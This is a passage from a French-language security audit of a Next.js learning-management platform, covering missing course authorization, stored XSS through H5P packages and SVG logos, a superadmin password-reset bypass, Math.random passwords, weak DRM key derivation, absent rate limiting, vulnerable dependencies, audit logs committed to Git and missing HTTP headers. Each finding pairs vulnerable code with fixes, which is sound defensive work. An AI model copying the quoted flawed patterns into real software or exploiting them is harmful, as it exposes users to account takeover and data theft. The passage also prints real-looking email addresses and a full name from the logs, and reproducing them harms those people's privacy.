- (contre-exemple correct : `src/app/api/documents/[id]/serve/route.ts:31-42`)

**CWE :** CWE-639 (contournement d'autorisation par manipulation de clé), CWE-284
**OWASP :** A01

**La faille.** La route documentaire vérifie l'affectation :

```ts
// src/app/api/documents/[id]/serve/route.ts:37-42 — le bon modèle
if (!isAdmin) {
  const assignment = await prisma.courseAssignment.findUnique({
    where: { userId_courseId: { userId: session.user.id, courseId: id } } });
  if (!assignment) return new NextResponse("Non autorisé", { status: 403 });
}
```

Les routes de cours ne le font pas :

```ts
// src/app/api/courses/[id]/serve/route.ts:14-33
const session = await auth();
if (!session) return NextResponse.redirect(new URL("/login", req.url));
const { id } = await params;
const course = await prisma.course.findUnique({ where: { id, isActive: true } });
…
if (course.isEncrypted && course.encryptedKey) {
  const enc = await readFile(h5pPath);
  decryptedH5P = await decryptBuffer(enc, course.encryptedKey);   // ← déchiffrement
}
```

```ts
// src/app/api/native-video/[id]/stream/route.ts:14-31
if (!session?.user?.id) return NextResponse.json({ error: "Non autorisé" }, { status: 401 });
const nativeVideo = await prisma.nativeVideo.findUnique({ where: { id } });
…
if (nativeVideo.isEncrypted && nativeVideo.encryptedKey) {
  const { stream } = await decryptVideoRange(filePath, nativeVideo.encryptedKey, …);
  // ← flux déchiffré servi à tout compte authentifié
```

`GET /api/admin/courses/[id]` (ligne 49) renvoie de plus l'enregistrement complet du cours, `encryptedKey` et `licenseEncryptedKey` inclus, à tout utilisateur connecté.

**Exploitation.** Un apprenant énumère les `id` de cours (fournis par `/api/admin/courses/categories` et les pages de listing, ou par force brute sur des cuid) et récupère l'intégralité du catalogue en clair — y compris les cours d'autres services, les documents RH et les vidéos internes. Le chiffrement au repos (H5P/PDF en AES-GCM, vidéos en AES-CTR) est intégralement contourné puisque le serveur déchiffre à la demande sans contrôle.

**Impact.** Fuite de tout le contenu pédagogique et documentaire, et invalidation de la promesse DRM du produit : le contenu « protégé par licence » est extractible par n'importe quel titulaire de compte, y compris un stagiaire.

**Correction.** Une fonction unique de contrôle d'accès en lecture, appliquée aux quatre routes.

```ts
// src/lib/authz.ts
export async function canReadCourse(
  userId: string, sessionMode: string | null | undefined, courseId: string,
): Promise<boolean> {
  if (sessionMode === "admin") return true;

  const [assignment, priv] = await Promise.all([
    prisma.courseAssignment.findUnique({
      where: { userId_courseId: { userId, courseId } } }),
    prisma.userRole.findFirst({
      where: { userId, role: { name: { in: ["admin", "superadmin"] } } } }),
  ]);
  if (assignment || priv) return true;

  // Créateur du cours, ou manager du créateur
  return canEditCourse(userId, sessionMode, courseId);
}
```

```ts
// src/app/api/courses/[id]/serve/route.ts, /content/[...path], /quiz
if (!await canReadCourse(session.user.id, session.user.sessionMode, id))
  return new NextResponse("Non autorisé", { status: 403 });

// src/app/api/native-video/[id]/stream/route.ts — passer par le cours parent
const nativeVideo = await prisma.nativeVideo.findUnique({
  where: { id }, select: { courseId: true, videoPath: true, isEncrypted: true, encryptedKey: true },
});
if (!nativeVideo) return NextResponse.json({ error: "Vidéo introuvable" }, { status: 404 });
if (!await canReadCourse(session.user.id, session.user.sessionMode, nativeVideo.courseId))
  return NextResponse.json({ error: "Non autorisé" }, { status: 403 });
```

Et restreindre `GET /api/admin/courses/[id]` aux rôles d'édition, avec un `select` explicite qui exclut `encryptedKey`, `licenseEncryptedKey` et `contentManifest`.

---

### H-03 🟠 XSS stocké via paquet H5P servi en même origine, sans `sandbox` ni CSP

**Fichiers :** `src/app/api/courses/[id]/content/[...path]/route.ts:41-51` — `src/app/api/courses/[id]/serve/route.ts:81-234` — `src/components/courses/h5p-player.tsx:17-22` — `src/lib/h5p.ts:29-30`
**CWE :** CWE-79 (XSS stocké), CWE-434
**OWASP :** A03

**La faille.** Un fichier `.h5p` est un ZIP fourni par un `creator`/`manager`. Il est décompressé tel quel :

```ts
// src/lib/h5p.ts:29-30
const zip = new AdmZip(zipBuffer);
zip.extractAllTo(extractDir, true);
```

Puis **n'importe quel fichier extrait** est servi avec le type MIME déduit de son extension :

```ts
// src/app/api/courses/[id]/content/[...path]/route.ts:44-51
const buffer = await readFile(candidate);
const mimeType = lookup(candidate) || "application/octet-stream";
return new NextResponse(buffer, {
  headers: { "Content-Type": mimeType, "Cache-Control": "private, max-age=3600" },
});
```

Un `payload.html` dans l'archive est donc renvoyé en `text/html`, **sur l'origine de l'application**. Le lecteur, lui, charge le contenu dans une iframe sans attribut `sandbox` :

```tsx
// src/components/courses/h5p-player.tsx:17-22
<iframe
  src={`/api/courses/${courseId}/serve${visited}`}
  style={{ … }} allow="fullscreen" title="Contenu H5P"
/>
```

Aucune CSP n'est définie (cf. M-01), et la page `serve` injecte elle-même des `<script>` inline. Le contenu tiers s'exécute donc avec les mêmes privilèges que l'application.

**Exploitation.** Un `creator` (rôle attribuable par un simple manager, cf. `src/app/api/manager/team-members/[userId]/role/route.ts`) publie un cours contenant un fichier HTML ou une bibliothèque H5P modifiée. Chaque apprenant qui l'ouvre exécute le script de l'attaquant en même origine : lecture de la session, appel de `/api/auth/session-mode` ou des routes admin si la victime est administrateur, exfiltration du contenu déchiffré, création de comptes.

**Impact.** Élévation de privilèges de `creator` vers `admin` par vol de session ou action forcée dans le navigateur d'un administrateur ; propagation à tous les apprenants d'un cours.

**Correction.** Trois couches, à appliquer ensemble.

```ts
// 1) src/app/api/courses/[id]/content/[...path]/route.ts — n'autoriser que des types inertes
const SAFE_MIME = new Set([
  "text/css", "text/plain", "application/javascript", "application/json",
  "image/png", "image/jpeg", "image/gif", "image/webp",
  "audio/mpeg", "audio/ogg", "video/mp4", "video/webm",
  "font/woff", "font/woff2", "application/font-woff",
]);

const mimeType = lookup(candidate) || "application/octet-stream";
if (!SAFE_MIME.has(mimeType))
  return NextResponse.json({ error: "Type de contenu non autorisé" }, { status: 415 });

return new NextResponse(buffer, {
  headers: {
    "Content-Type": mimeType,
    "X-Content-Type-Options": "nosniff",
    "Content-Security-Policy": "sandbox; default-src 'none'",
    "Cache-Control": "private, max-age=3600",
  },
});
```

```tsx
// 2) src/components/courses/h5p-player.tsx — cloisonner l'iframe
<iframe
  src={`/api/courses/${courseId}/serve${visited}`}
  sandbox="allow-scripts allow-same-origin allow-fullscreen"
  // Idéalement : servir le contenu depuis une origine dédiée
  // (ex. content.lms.interne) et retirer allow-same-origin.
  allow="fullscreen"
  title="Contenu H5P"
/>
```

```ts
// 3) src/app/api/courses/[id]/serve/route.ts — CSP sur la page du lecteur
return new NextResponse(html, {
  headers: {
    "Content-Type": "text/html; charset=utf-8",
    "Content-Security-Policy": [
      "default-src 'none'",
      `script-src 'self' 'nonce-${nonce}'`,   // remplacer les <script> inline par un nonce
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: blob:", "media-src 'self' blob:", "font-src 'self'",
      "connect-src 'self'", "frame-ancestors 'self'",
    ].join("; "),
  },
});
```

Compléments : valider le contenu de l'archive à l'upload (liste blanche d'extensions, refus de `.html`, `.htm`, `.svg`, `.xhtml`, `.swf`), plafonner la taille décompressée (M-03), et vérifier la présence d'un `h5p.json` conforme avant d'accepter le paquet. Noter aussi que `${msg}` est interpolé sans échappement dans la page d'erreur (`serve/route.ts:46`).

---

### H-04 🟠 XSS stocké via upload de logo SVG servi publiquement

**Fichiers :** `src/app/api/admin/branding/route.ts:11, 13-31` — `src/app/api/public/assets/[...path]/route.ts:26-36`
**CWE :** CWE-79, CWE-434
**OWASP :** A03

**La faille.** Le SVG est accepté comme image de marque :

```ts
// src/app/api/admin/branding/route.ts:11
const ALLOWED_IMAGE_TYPES = ["image/png", "image/jpeg", "image/svg+xml", "image/webp"];
```

et l'extension du fichier stocké provient du nom fourni par le client, sans validation du contenu :

```ts
// src/app/api/admin/branding/route.ts:21-28
const ext = file.name.split(".").pop()?.toLowerCase() ?? "bin";
const filename = `${Date.now()}.${ext}`;
…
await writeFile(filePath, buffer);          // aucun contrôle du contenu réel
```

Le fichier est ensuite servi **sans authentification** avec le type `image/svg+xml` :

```ts
// src/app/api/public/assets/[...path]/route.ts:26-36
const contentTypes: Record<string, string> = {
  png: "image/png", jpg: "image/jpeg", jpeg: "image/jpeg",
  svg: "image/svg+xml", webp: "image/webp",
};
return new NextResponse(buffer, {
  headers: { "Content-Type": contentTypes[ext] ?? "application/octet-stream",
             "Cache-Control": "public, max-age=3600" },
});
```

Un SVG servi en `image/svg+xml` et ouvert directement dans l'onglet exécute ses `<script>` dans l'origine de l'application.

**Exploitation.** Un compte `admin` (ou un attaquant ayant obtenu ce niveau, par exemple via C-05) dépose un logo SVG contenant un script, puis diffuse le lien `/api/public/assets/branding/logo/<ts>.svg`. La page de connexion référençant ce logo, le vecteur touche aussi les utilisateurs non authentifiés (hameçonnage de crédentiels sur le domaine légitime).

**Impact.** XSS persistant sur une ressource publique de confiance ; vol de session, hameçonnage crédible, défiguration.

**Correction.**

```ts
// src/app/api/admin/branding/route.ts
const ALLOWED_IMAGE_TYPES = ["image/png", "image/jpeg", "image/webp"];  // SVG retiré
const EXT_BY_MIME: Record<string, string> = {
  "image/png": "png", "image/jpeg": "jpg", "image/webp": "webp",
};

async function saveFile(file: File, subfolder: string, maxSize: number): Promise<string> {
  if (!ALLOWED_IMAGE_TYPES.includes(file.type))
    throw new Error(`Type de fichier non autorisé : ${file.type}`);
  if (file.size > maxSize) throw new Error(`Fichier trop volumineux`);

  const buffer = Buffer.from(await file.arrayBuffer());

  // Vérifier la signature binaire réelle, pas le type déclaré
  const isPng  = buffer.subarray(0, 8).equals(Buffer.from([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a]));
  const isJpeg = buffer[0] === 0xff && buffer[1] === 0xd8;
  const isWebp = buffer.subarray(0, 4).toString() === "RIFF"
              && buffer.subarray(8, 12).toString() === "WEBP";
  if (!isPng && !isJpeg && !isWebp) throw new Error("Contenu d'image invalide");

  const ext = EXT_BY_MIME[file.type];                      // jamais issu de file.name
  const filename = `${randomUUID()}.${ext}`;
  …
}
```

```ts
// src/app/api/public/assets/[...path]/route.ts — durcir la réponse
return new NextResponse(buffer, {
  headers: {
    "Content-Type": contentTypes[ext] ?? "application/octet-stream",
    "X-Content-Type-Options": "nosniff",
    "Content-Disposition": "inline",
    "Content-Security-Policy": "default-src 'none'; sandbox",
    "Cache-Control": "public, max-age=3600",
  },
});
```

Si le SVG doit absolument rester accepté : le passer par un assainisseur (DOMPurify côté serveur en mode SVG, ou `svgo` avec suppression des scripts/`on*`/`xlink:href` externes) et le servir en `Content-Disposition: attachment` ou depuis une origine séparée.

---

### H-05 🟠 Un `admin` peut réinitialiser le mot de passe du superadmin protégé

**Fichiers :** `src/app/api/admin/users/[id]/reset-password/route.ts:15-30` — à comparer avec `src/app/api/admin/users/[id]/route.ts:27-29` et `102-104`
**CWE :** CWE-269 (gestion de privilèges incorrecte), CWE-639
**OWASP :** A01

**La faille.** Les routes de modification et de suppression protègent bien le compte `isProtected` :

```ts
// src/app/api/admin/users/[id]/route.ts:27-29
const targetMeta = await prisma.user.findUnique({
  where: { id }, select: { isProtected: true, … } });
if (targetMeta?.isProtected)
  return NextResponse.json({ error: "Le compte Super Admin est protégé …" }, { status: 403 });
```

La réinitialisation de mot de passe, elle, ne vérifie que « ce n'est pas moi-même » :

```ts
// src/app/api/admin/users/[id]/reset-password/route.ts:19-30
if (id === session.user.id)
  return NextResponse.json({ error: "Utilisez les paramètres de votre compte …" }, { status: 400 });

const user = await prisma.user.findUnique({
  where: { id }, select: { id: true, name: true, email: true } });   // isProtected non lu
…
const newPassword = generateStrongPassword();
await prisma.user.update({ where: { id }, data: { passwordHash } });
…
return NextResponse.json({ ok: true, password: newPassword, emailSent });   // ← rendu en clair
```

**Exploitation.** Un `admin` appelle `POST /api/admin/users/<id-du-superadmin>/reset-password`. La réponse HTTP contient le nouveau mot de passe en clair : il se connecte immédiatement en superadmin. La protection `isProtected` qui existe partout ailleurs est ainsi entièrement contournée.

**Impact.** Élévation horizontale/verticale `admin` → `superadmin`, prise de contrôle du compte le plus privilégié, avec un seul appel API. Le mot de passe transitant aussi par email en clair (`templateAccountCreated`), il subsiste dans la boîte de la victime et dans les journaux SMTP.

**Correction.**

```ts
// src/app/api/admin/users/[id]/reset-password/route.ts
const user = await prisma.user.findUnique({
  where: { id },
  select: { id: true, name: true, email: true, isProtected: true,
            roles: { include: { role: true } } },
});
if (!user) return NextResponse.json({ error: "Utilisateur introuvable" }, { status: 404 });

if (user.isProtected)
  return NextResponse.json({ error: "Ce compte est protégé." }, { status: 403 });

// Un admin ne réinitialise pas un compte de niveau supérieur ou égal
const actorRoles = await prisma.userRole.findMany({
  where: { userId: session.user.id }, include: { role: true } });
const actorIsSuper = actorRoles.some((r) => r.role.name === "superadmin");
const targetIsPrivileged = user.roles.some((r) =>
  r.role.name === "admin" || r.role.name === "superadmin");
if (targetIsPrivileged && !actorIsSuper)
  return NextResponse.json({ error: "Réservé au superadmin." }, { status: 403 });

const newPassword = generateStrongPassword();   // ← à corriger aussi, cf. H-06
await prisma.user.update({
  where: { id },
  data: { passwordHash: await bcrypt.hash(newPassword, 12), mustChangePassword: true },
});

// Ne renvoyer le mot de passe que si l'email n'a pas pu partir
return NextResponse.json({ ok: true, emailSent, ...(emailSent ? {} : { password: newPassword }) });
```

Prévoir en complément un lien de réinitialisation à usage unique et à durée limitée plutôt qu'un mot de passe transmis par email, et un drapeau `mustChangePassword` imposant le changement à la première connexion.

---

### H-06 🟠 Mots de passe générés avec `Math.random()`

**Fichier :** `src/lib/password.ts:26-43` — appelé par `src/app/api/admin/users/route.ts:56`, `src/app/api/admin/users/[id]/reset-password/route.ts:27`, `src/app/api/admin/users/import/route.ts`
**CWE :** CWE-338 (générateur pseudo-aléatoire non cryptographique), CWE-330
**OWASP :** A02 Cryptographic Failures

**La faille.**

```ts
// src/lib/password.ts:33-42
const rand = (chars: string) => chars[Math.floor(Math.random() * chars.length)];
const mandatory = [rand(upper), rand(lower), rand(digits), rand(special)];
const rest = Array.from({ length: 8 }, () => rand(all));
return [...mandatory, ...rest]
  .sort(() => Math.random() - 0.5)      // mélange biaisé de surcroît
  .join("");
```

`Math.random()` (xorshift128+ dans V8) n'est pas cryptographique : son état interne est reconstituable à partir de quelques sorties observées, ce qui permet de prédire les valeurs suivantes **et** précédentes. Le tri par `Math.random() - 0.5` est en outre un mélange non uniforme, qui laisse les quatre caractères obligatoires statistiquement en tête.

**Exploitation.** Tous les mots de passe initiaux et réinitialisés proviennent du même générateur, dans le même processus. Un attaquant qui obtient un mot de passe généré (le sien, lors de la création de son compte d'apprenant, ou via un import) peut reconstituer l'état du PRNG et prédire les mots de passe générés ensuite pour d'autres comptes — y compris un compte administrateur créé dans la même minute.

**Impact.** Prise de contrôle de comptes fraîchement créés ou réinitialisés, y compris privilégiés, sans force brute.

**Correction.**

```ts
// src/lib/password.ts
import { randomInt } from "crypto";

export function generateStrongPassword(length = 16): string {
  const upper   = "ABCDEFGHJKLMNPQRSTUVWXYZ";
  const lower   = "abcdefghjkmnpqrstuvwxyz";
  const digits  = "23456789";
  const special = "!@#$%&*-_=+?";
  const all = upper + lower + digits + special;

  const pick = (chars: string) => chars[randomInt(chars.length)];   // CSPRNG

  const chars = [pick(upper), pick(lower), pick(digits), pick(special)];
  while (chars.length < length) chars.push(pick(all));

  // Mélange de Fisher-Yates à biais nul
  for (let i = chars.length - 1; i > 0; i--) {
    const j = randomInt(i + 1);
    [chars[i], chars[j]] = [chars[j], chars[i]];
  }
  return chars.join("");
}
```

Passer par ailleurs la longueur de 12 à 16 caractères pour des secrets transmis par email, et vérifier qu'aucun autre usage de `Math.random()` ne concerne un identifiant de sécurité (`src/app/api/admin/courses/upload/route.ts:47` l'utilise pour un nom de fichier temporaire — préférer `randomBytes(8)`, comme le fait déjà la route vidéo).

---

### H-07 🟠 Dérivation de clé absente et clé de repli `000…0` pour le chiffrement DRM

**Fichiers :** `src/lib/license-verify.ts:62-70, 72-82` — `src/lib/instance-crypto.ts:33-43, 45-57`
**CWE :** CWE-1394 (clé cryptographique par défaut), CWE-916 (dérivation de clé insuffisante), CWE-321
**OWASP :** A02

**La faille.** La clé AES-256 qui protège la `contentKey` de licence est le secret d'authentification, complété par des zéros :

```ts
// src/lib/license-verify.ts:62-70
function encryptContentKey(contentKeyHex: string): string {
  const secret = (process.env.NEXTAUTH_SECRET ?? process.env.AUTH_SECRET) ?? "";
  const key    = Buffer.from(secret.padEnd(32, "0").slice(0, 32), "utf-8");
  const iv     = randomBytes(16);
  const cipher = createCipheriv("aes-256-gcm", key, iv);
  …
}
```

Trois défauts cumulés :
1. **Clé par défaut prévisible** — si `AUTH_SECRET`/`NEXTAUTH_SECRET` est absent, `secret` vaut `""` et la clé devient 32 octets `0x30` (`"0000…0"`). Le chiffrement n'apporte alors aucune confidentialité : quiconque récupère la base déchiffre la `contentKey`, donc tout le contenu DRM. Aucune exception n'est levée, contrairement à `instance-crypto.ts:35` qui, lui, vérifie la présence du secret.
2. **Pas de fonction de dérivation** — les octets du secret sont utilisés directement comme clé, au lieu de passer par HKDF/PBKDF2. Un secret court, une phrase de passe ou un secret partagé avec un autre usage réduisent d'autant l'entropie effective.
3. **Pas de séparation de domaine** — le même secret sert à signer les jetons de session, à chiffrer la clé privée RSA d'instance (`instance-crypto.ts:36`) et la `contentKey`. La fuite d'un seul secret compromet trois périmètres à la fois.

`instance-crypto.ts:36` ajoute un défaut de robustesse : `Buffer.from(secret).subarray(0, 32).toString().padEnd(32, "0").slice(0, 32)` fait un aller-retour octets → chaîne UTF-8 → octets. Avec un secret contenant des caractères non ASCII (base64 avec accents, émoji, ou coupure au milieu d'un caractère multi-octets), la longueur en octets diffère de 32 et `createCipheriv` lève `Invalid key length` — ou, pire, la clé obtenue diffère entre deux exécutions.

**Exploitation.** Sur une instance déployée sans `AUTH_SECRET` (le `.env.example` fournit `changez-ce-secret-en-production`, souvent laissé tel quel), une copie de la base — sauvegarde téléchargée, dump volé, accès en lecture PostgreSQL — suffit pour déchiffrer `InstanceConfig.contentKey`, puis toutes les `licenseEncryptedKey`, puis tous les cours et vidéos.

**Impact.** Effondrement du modèle DRM : le contenu commercialisé sous licence devient extractible hors ligne. Avec le secret par défaut du `.env.example`, la clé est même identique sur toutes les instances mal configurées.

**Correction.**

```ts
// src/lib/crypto-keys.ts (nouveau) — dérivation unique et vérifiée
import { hkdfSync } from "crypto";

function rawSecret(): Buffer {
  const secret = process.env.AUTH_SECRET ?? process.env.NEXTAUTH_SECRET;
  if (!secret || secret.length < 32)
    throw new Error("AUTH_SECRET manquant ou trop court (32 caractères minimum)");
  if (secret.startsWith("changez-ce-secret"))
    throw new Error("AUTH_SECRET est resté à sa valeur d'exemple");
  return Buffer.from(secret, "utf-8");
}

/** Clé de 32 octets dédiée à un usage donné (séparation de domaine). */
export function deriveKey(purpose: "content-key" | "instance-private-key"): Buffer {
  return Buffer.from(
    hkdfSync("sha256", rawSecret(), Buffer.from("lms-by-module-v1"), purpose, 32)
  );
}
```

```ts
// src/lib/license-verify.ts
import { deriveKey } from "@/lib/crypto-keys";

function encryptContentKey(contentKeyHex: string): string {
  const key = deriveKey("content-key");
  const iv  = randomBytes(12);                    // 96 bits : IV standard pour GCM
  const cipher = createCipheriv("aes-256-gcm", key, iv);
  const enc = Buffer.concat([cipher.update(contentKeyHex, "utf-8"), cipher.final()]);
  return Buffer.concat([Buffer.from([2]), iv, cipher.getAuthTag(), enc]).toString("base64");
  //                    ↑ octet de version, pour migrer sans casser l'existant
}
```

Prévoir une migration : lire l'ancien format (préfixe absent → IV de 16 octets, ancienne dérivation) et réécrire au format 2 au premier accès. Ajouter une vérification au démarrage (`instrumentation.ts`) qui refuse de servir si `AUTH_SECRET` est absent, trop court ou égal à la valeur d'exemple. À terme, envisager un magasin de clés externe (fichier hors base, KMS) pour que la seule copie de la base ne suffise jamais à déchiffrer le contenu.

---

### H-08 🟠 Aucune limitation de tentatives sur l'authentification

**Fichiers :** `src/lib/auth.ts:24-59` — `src/app/api/auth/confirm-password/route.ts:6-19` — `src/app/api/auth/session-mode/route.ts:22-38`
**CWE :** CWE-307 (tentatives d'authentification non restreintes), CWE-799
**OWASP :** A07

**La faille.** `authorize` compare le mot de passe et journalise l'échec, sans jamais compter les tentatives ni verrouiller le compte :

```ts
// src/lib/auth.ts:39-46
const valid = await bcrypt.compare(credentials.password as string, user.passwordHash);
if (!valid) {
  void auditLog({ actor: { … }, action: "auth.login_failed",
                  details: { reason: "invalid_password" } });
  return null;      // aucun compteur, aucun délai, aucun verrouillage
}
```

Aucune trace de limitation de débit ailleurs dans le code (`grep -rE "rate.?limit|throttle|lockout"` : aucun résultat fonctionnel). Deux autres oracles de mot de passe sont exposés au même titre : `/api/auth/confirm-password` et le passage en mode admin `/api/auth/session-mode`, tous deux appelables en boucle par un utilisateur authentifié.

**Exploitation.** Force brute ou bourrage d'identifiants sur `/api/auth/callback/credentials`, sans plafond. Le coût bcrypt 12 limite le débit à quelques dizaines d'essais par seconde et par cœur — suffisant pour un dictionnaire ciblé, et suffisant aussi pour saturer le CPU du serveur (déni de service par épuisement, l'API d'authentification n'étant pas isolée).

**Impact.** Compromission de comptes à mot de passe faible ou réutilisé ; déni de service applicatif ; bruit massif dans le journal d'audit.

**Correction.** Limitation en base, par identifiant et par IP, avec verrouillage progressif.

```ts
// prisma/schema.prisma
model LoginAttempt {
  id         String   @id @default(cuid())
  identifier String            // email normalisé ou "ip:<addr>"
  success    Boolean
  ipAddress  String?
  createdAt  DateTime @default(now())

  @@index([identifier, createdAt])
}
```

```ts
// src/lib/login-throttle.ts
const WINDOW_MS = 15 * 60_000;
const MAX_FAILURES = 5;

export async function isThrottled(identifier: string): Promise<boolean> {
  const failures = await prisma.loginAttempt.count({
    where: { identifier, success: false, createdAt: { gt: new Date(Date.now() - WINDOW_MS) } },
  });
  return failures >= MAX_FAILURES;
}

export async function recordAttempt(identifier: string, success: boolean, ip?: string) {
  await prisma.loginAttempt.create({ data: { identifier, success, ipAddress: ip ?? null } });
  if (success) {
    await prisma.loginAttempt.deleteMany({ where: { identifier, success: false } });
  }
}
```

```ts
// src/lib/auth.ts — dans authorize()
const email = (credentials.email as string).trim().toLowerCase();
if (await isThrottled(email)) {
  void auditLog({ actor: { email }, action: "auth.login_throttled" });
  return null;      // message identique à un échec : pas d'oracle
}
…
if (!valid) { await recordAttempt(email, false); … return null; }
await recordAttempt(email, true);
```

Ajouter la même protection sur `confirm-password` et `session-mode` (compteur par `userId`), un délai artificiel constant pour éviter les attaques temporelles sur « utilisateur inexistant » vs « mot de passe faux », et une limitation de débit en amont côté Caddy :

```caddyfile
# Caddyfile
rate_limit {
  zone login { key {remote_host} events 10 window 1m }
  match { path /api/auth/callback/* /api/auth/session-mode /api/auth/confirm-password }
}
```

---

### H-09 🟠 Dix vulnérabilités connues dans les dépendances, dont deux critiques

**Fichier :** `package.json` / `package-lock.json`
**CWE :** CWE-1395 (dépendance à un composant vulnérable)
**OWASP :** A06 Vulnerable and Outdated Components

**Constat (`npm audit`, 25/07/2026) : 10 vulnérabilités — 2 critiques, 8 élevées.**

| Paquet | Version | Gravité | Points saillants |
|---|---|---|---|
| `@auth/core` | < 0.41.3 | **Critique** | Contournement du normalisateur d'email par homoglyphe `@` ; cookies `state`/`nonce`/PKCE non liés au fournisseur ; exception non capturée sur en-tête `Bearer` malformé (déni de service) |
| `next` | 15.5.18 | Élevée | Divulgation non authentifiée d'endpoints de fonctions serveur internes ; SSRF via réécritures ; confusion de cache sur réponses à corps de requête ; déni de service via Server Actions |
| `nodemailer` | ≤ 9.0.0 | Élevée | Injection de commandes SMTP (`envelope.size`, CRLF dans le nom de transport) ; injection d'en-têtes ; validation TLS incorrecte lors de la récupération de jeton OAuth2 |
| `postcss` | ≤ 8.5.17 | Élevée | XSS via `</style>` non échappé ; lecture de fichier arbitraire via `sourceMappingURL` |
| `sharp` | < 0.35.0 | Élevée | Vulnérabilités libvips héritées (CVE-2026-33327/33328/35590/35591) |
| `js-yaml` | 4.0.0–4.2.0 | Élevée | Déni de service quadratique via chaînes de clés de fusion |
| `brace-expansion` | — | — | Transitive (chaîne ESLint) |

Deux entrées méritent une attention particulière dans ce contexte :
- **`@auth/core`** porte toute l'authentification de l'application. La divulgation non authentifiée d'endpoints de fonctions serveur (avis Next.js) se combine directement avec M-13 : elle facilite la découverte des Server Actions non protégées.
- **`nodemailer`** reçoit des données contrôlées par l'utilisateur (noms, titres de cours) dans les templates d'email ; l'injection d'en-têtes par CRLF y est directement pertinente.

**Correction.**

```bash
npm audit fix                    # next, @auth/core, postcss, sharp, js-yaml
npm audit fix --force            # nodemailer 9.0.3 (changement majeur : à tester)
npx prisma generate && npm run build
```

Vérifier après mise à jour :
- `next-auth@5.0.0-beta.31` reste une préversion : planifier le passage en version stable dès sa publication et relire les notes de migration (les callbacks `jwt`/`session` sont impactés par les correctifs de liaison de cookies) ;
- `nodemailer@9` modifie certaines options de transport — revoir `src/lib/mail.ts:10-22` ;
- mettre en place une surveillance continue : `npm audit --audit-level=high` en pré-commit ou en CI, et activer Dependabot sur le dépôt GitHub.

---

### H-10 🟠 Journaux d'audit contenant des données personnelles versionnés dans Git

**Fichiers :** `logs/audit/audit-2026-05-22.log` … `audit-2026-06-11.log` (10 fichiers suivis) — `.gitignore` (pas d'entrée `logs/`)
**CWE :** CWE-532 (insertion d'informations sensibles dans un fichier de journal), CWE-359
**OWASP :** A01 / A09

**La faille.** `git ls-files logs` liste dix fichiers de journal d'audit versionnés. Leur contenu comprend des données personnelles réelles :

```json
{"ts":"2026-06-11T10:06:05.983Z","actor":"danje57+jdannenmuller@gmail.com","actorName":"Jeremy DANNENMULLER","action":"auth.login","target":null,"details":null}
{"ts":"2026-06-11T10:06:45.165Z","actor":"danje57+mangin@gmail.com","actorName":null,"action":"auth.login_failed","target":null,"details":{"reason":"user_not_found"}}
```

Le `.gitignore` exclut bien `uploads/`, `backups/` et `.env`, mais pas `logs/`. Un des fichiers est d'ailleurs modifié dans l'arbre de travail au moment de l'audit : le journal continue d'être écrit dans le dépôt à chaque exécution.

**Exploitation.** Toute personne ayant accès au dépôt (et *a fortiori* si le dépôt GitHub `danje57/LMS_by_module` devient public ou est cloné par un tiers) obtient : la liste nominative des utilisateurs, leurs adresses email, leurs horaires de connexion, les échecs d'authentification (donc les identifiants existants), et les actions administratives. Le déversement d'un dépôt privé (poste développeur compromis, jeton d'accès fuité) suffit.

**Impact.** Violation de données personnelles au sens du RGPD (identité, données de connexion, traçabilité d'activité), avec obligation potentielle de notification. Reconnaissance facilitée pour un attaquant (énumération de comptes valides, ciblage des administrateurs).

**Correction.**

```bash
# 1) Cesser le suivi (les fichiers restent sur le disque)
git rm -r --cached logs/
printf 'logs/\n' >> .gitignore
git commit -m "chore: exclure les journaux d'audit du suivi Git (données personnelles)"

# 2) Purger l'historique — le dépôt distant conserve sinon les données
#    (git-filter-repo est l'outil recommandé ; réécrit l'historique, à coordonner)
git filter-repo --path logs --invert-paths
git push --force-with-lease origin main
```

En complément :
- externaliser les journaux hors de l'arborescence du code (`AUDIT_LOG_DIR=/var/log/lms` ; la variable existe déjà, `src/lib/audit.ts:19`) ;
- appliquer une rotation et une politique de rétention alignée sur `auditLogRetentionDays` au journal fichier aussi (aujourd'hui seule la table `AuditLog` est purgée) ;
- réduire les données personnelles dans le journal : conserver l'`actorId` et un email haché plutôt qu'en clair pour les événements `auth.login_failed` sur compte inexistant ;
- révoquer/renouveler les mots de passe des comptes apparaissant dans l'historique si le dépôt a pu être exposé.

---

## 4. Constats de sévérité moyenne

### M-01 🟡 Aucun en-tête de sécurité HTTP

**Fichiers :** `next.config.ts:9-27` (aucune clé `headers`) — `Caddyfile:5-13`
**CWE :** CWE-1021 (interface restreinte de manière inadéquate), CWE-693
**OWASP :** A05 Security Misconfiguration

Aucune CSP, aucun `X-Frame-Options`/`frame-ancestors`, aucun HSTS, `Referrer-Policy`, `X-Content-Type-Options` ni `Permissions-Policy` sur l'application. Conséquences : détournement de clic (l'application est encadrable), aucune atténuation des XSS de H-03/H-04, référents fuités vers l'extérieur, reniflage de type MIME.

```ts
// next.config.ts
const nextConfig: NextConfig = {
  …
  async headers() {
    return [{
      source: "/:path*",
      headers: [
        { key: "X-Frame-Options", value: "DENY" },
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
        { key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains" },
        { key: "Content-Security-Policy", value: [
            "default-src 'self'",
            "script-src 'self' 'unsafe-inline'",   // à resserrer avec un nonce
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: blob:",
            "media-src 'self' blob:",
            "font-src 'self' data:",
            "connect-src 'self'",
            "frame-src 'self'",
            "frame-ancestors 'none'",
            "object-src 'none'",
            "base-uri 'self'",
            "form-action 'self'",
          ].join("; ") },
      ],
    }];
  },
};
```

```caddyfile
# Caddyfile
:443 {
  tls internal
  header {
    Strict-Transport-Security "max-age=31536000; includeSubDomains"
    X-Content-Type-Options "nosniff"
    Referrer-Policy "strict-origin-when-cross-origin"
    -Server
  }
  reverse_proxy app:3000
}
```

Le `script-src 'unsafe-inline'` reste nécessaire tant que `src/app/layout.tsx:26-33` injecte le script de thème en inline ; le remplacer par un nonce permet de le retirer.

---

### M-02 🟡 Anti-traversée de chemin par suppression de `..` au lieu d'une vérification de confinement

**Fichiers :** `src/app/api/assets/[...path]/route.ts:16-18` — `src/app/api/public/assets/[...path]/route.ts:15-22`
**CWE :** CWE-22 (traversée de répertoire), CWE-180 (validation avant canonisation)
**OWASP :** A01

```ts
